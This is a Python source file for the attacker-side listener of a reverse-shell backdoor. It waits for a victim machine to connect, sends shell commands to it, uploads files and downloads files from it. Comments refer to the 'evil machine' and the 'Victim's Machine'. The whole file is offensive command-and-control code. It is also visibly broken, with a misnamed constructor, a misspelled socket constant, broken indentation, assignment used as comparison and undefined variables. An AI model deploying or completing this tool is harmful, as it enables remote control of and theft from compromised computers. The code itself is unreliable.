#Listener

import socket
import json
import base64

class Listener : 
	def _init_(self, ip, port):
		listener = socket.socket(socket.AF_INET, socket.SOCK_STEAM)
		listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
		listener.bind((ip, port))
		listener.listen(0) #0 is used as the backlog
		print("\n{+] Waiting for incoming connections.")
		self.connection, address = listener.accept()
		print("[+] Got a connection. " + str[address])

	def reliable_send(self, data):
		json_data = json.dumps(data)
		self.connection.send(json_data)

		def reliable_receive(self):
		json_data = ""
		while True : 
			try : 
				json_data = json_data + self.connnection.recv(1024)
				return json.loads(json_data)
			except ValueError:
				continue
		def read_file(self, path):
			with open(path, "rb") as file : 
				return base64.b64encode(file.read())
		# Here we have added the reading of a file

	def write_file(self,path,content)
		with open(path, "wb") as file : 
			file.write(base64.b64decode(content))
			return "[+] Download Successful. " 
	#This method will download the file over to the evil machine by writing the contents of the file from the Victim's Machine.

	def execute_remotely(self, command):
			self.reliable_send(command)
			if command[0] = "exit" : 
				self.connnection.close()
				exit()
			return self.reliable_receive()

	def run(self):
		while True:
			command_input = raw_input(">> ")
			command = command.split(" ")
			
			try : 
				if command[0] == "upload" :
						file_contentt = self.read_file(command[1])
						command.append(file_content)
				result = self.execute_remotely(command)
				if command[0] == "download" and "Error" not in result : 
					result = self.write_file(command[1], result)
			except Exception:
				result = "[-] Error during command execution. "
			
			print(result)
